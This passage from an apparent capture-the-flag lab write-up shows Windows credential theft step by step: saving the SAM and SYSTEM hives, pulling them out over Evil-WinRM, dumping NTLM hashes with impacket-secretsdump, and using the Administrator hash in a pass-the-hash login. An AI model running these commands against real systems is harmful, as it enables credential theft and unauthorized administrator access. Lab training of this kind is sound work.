we can use these hives to dump user NTLM hashes. We can then use the Administrator hash to authenticate instead of a plaintext password.

```
reg save hklm\sam sam
```

The operation completed successfully.

```
reg save hklm\system system
```

The operation completed successfully

Evil win rm only : 

```
download sam
```

```
download system
```

---

With the files now on our local machine, we can use Impacket's secretsdump module to dump the user NTLM hashes.

```
impacket-secretsdump -sam sam -system system local
```

```
impacket-secretsdump -sam sam -system system local Impacket v0.12.0.dev1 - Copyright 2023 Fortra [*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f3 41::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08 9c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information. [*] Cleaning up...
```

In the output, we find the Administrator NTLM hash 2b87e7c93a3e8a0ea4a581937016f341 . We can use it to directly log in to the account with Evil-WinRM by passing it as a parameter with -H .

```
evil-winrm -u Administrator -H [hash] -i [domain]
```

```
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb 

Evil-WinRM shell v3.5 

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 

Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents>
```